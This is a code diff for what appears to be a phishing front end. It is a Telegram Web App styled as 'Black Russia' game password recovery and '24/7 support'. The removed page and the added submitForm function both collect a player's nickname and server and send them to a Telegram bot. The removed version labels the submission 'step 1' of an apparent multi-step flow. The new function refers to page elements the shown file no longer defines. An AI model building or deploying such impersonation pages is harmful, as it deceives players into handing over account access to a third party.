@@ -1,157 +1,32 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Black Russia</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.95);
-            border: 2px solid #ff2222;
-            border-radius: 32px;
-            padding: 40px 28px;
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 20px 40px rgba(255, 0, 0, 0.2);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-        .logo h1 {
-            color: #ff2222;
-            font-size: 28px;
-            letter-spacing: 4px;
-            font-weight: 900;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-        }
-        .logo p {
-            color: #666;
-            font-size: 11px;
-            letter-spacing: 2px;
-            margin-top: 8px;
-        }
-        input, select {
-            width: 100%;
-            padding: 16px;
-            margin-bottom: 20px;
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 16px;
-            color: white;
-            font-size: 15px;
-            transition: all 0.2s;
-        }
-        input:focus, select:focus {
-            border-color: #ff2222;
-            outline: none;
-            box-shadow: 0 0 8px rgba(255, 34, 34, 0.3);
-        }
-        button {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(90deg, #cc0000, #ff2222);
-            border: none;
-            border-radius: 40px;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: transform 0.1s;
-        }
-        button:active {
-            transform: scale(0.97);
-        }
-        .footer {
-            text-align: center;
-            margin-top: 24px;
-            color: #444;
-            font-size: 10px;
-        }
-    </style>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">
-            <h1>⛓️ BR ⛓️</h1>
-            <p>ВОССТАНОВЛЕНИЕ ПАРОЛЯ</p>
-        </div>
+function submitForm() {
+    const nickname = document.getElementById('nickname').value;
+    const serverElement = document.getElementById('server');
+    const serverText = serverElement.options[serverElement.selectedIndex].text;
 
-        <input type="text" id="nickname" placeholder="🔒 ИГРОВОЙ НИКНЕЙМ" autocomplete="off">
-        
-        <select id="server">
-            <option value="" disabled selected>🌍 ВЫБЕРИ СЕРВЕР</option>
-        </select>
+    if(!nickname) {
+        alert("Пожалуйста, введите ваш никнейм!");
+        return;
+    }
 
-        <button id="submitBtn">ВОССТАНОВИТЬ ДОСТУП</button>
-        <div class="footer">Black Russia — поддержка 24/7</div>
-    </div>
+    // Собираем данные в объект
+    const dataToSend = {
+        nickname: nickname,
+        server: serverText
+    };
 
-    <script>
-        const servers = [
-            "Red","Green","Blue","Yellow","Orange","Purple","Lime","Pink","Cherry","Black",
-            "Indigo","White","Magenta","Crimson","Gold","Azure","Platinum","Aqua","Gray","Ice",
-            "Chilli","Choco","Moscow","SPB","Ufa","Sochi","Kazan","Samara","Rostov","Anapa",
-            "EKB","Krasnodar","Arzamas","Novosib","Grozny","Saratov","Omsk","Irkutsk","Volgograd",
-            "Voronezh","Belgorod","Makhachkala","Vladikavkaz","Vladivostok","Kaliningrad","Chelyabinsk",
-            "Krasnoyarsk","CHEBOKSARY","KHABAROVSK","PERM","TULA","RYAZAN","MURMANSK","PENZA","KURSK",
-            "ARKHANGELSK","ORENBURG","KIROV","KEMEROVO","TYUMEN","TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK",
-            "PSKOV","BRYANSK","OREL","YAROSLAVL","BARNAUL","LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK",
-            "ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR","KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK",
-            "IZHEVSK","SURGUT","PODOLSK","MAGADAN","CHEREPOVETS","NORILSK","ASTANA"
-        ];
+    // ОТПРАВКА ДАННЫХ В БОТА (Важная строка!)
+    tg.sendData(JSON.stringify(dataToSend));
 
-        const serverSelect = document.getElementById('server');
-        servers.forEach(server => {
-            const option = document.createElement('option');
-            option.value = server;
-            option.textContent = server;
-            serverSelect.appendChild(option);
-        });
+    // Переключение на экран с пульсирующей зеленой галочкой
+    const card = document.getElementById('recoveryCard');
+    const success = document.getElementById('successScreen');
 
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.MainButton.hide();
-
-        document.getElementById('submitBtn').onclick = () => {
-            const nickname = document.getElementById('nickname').value.trim();
-            const server = document.getElementById('server').value;
-
-            if (!nickname) {
-                tg.showAlert('❌ Введи свой игровой никнейм!');
-                return;
-            }
-
-            if (!server) {
-                tg.showAlert('❌ Выбери сервер!');
-                return;
-            }
-
-            tg.sendData(JSON.stringify({
-                step: 1,
-                nickname: nickname,
-                server: server
-            }));
-
-            tg.showAlert('✅ Заявка отправлена! Ожидай.');
-            setTimeout(() => tg.close(), 1200);
-        };
-    </script>
-</body>
-</html>
+    card.style.opacity = '0';
+    setTimeout(() => {
+        card.style.display = 'none';
+        success.style.display = 'block';
+        setTimeout(() => {
+            success.style.opacity = '1';
+        }, 50);
+    }, 500);
+}
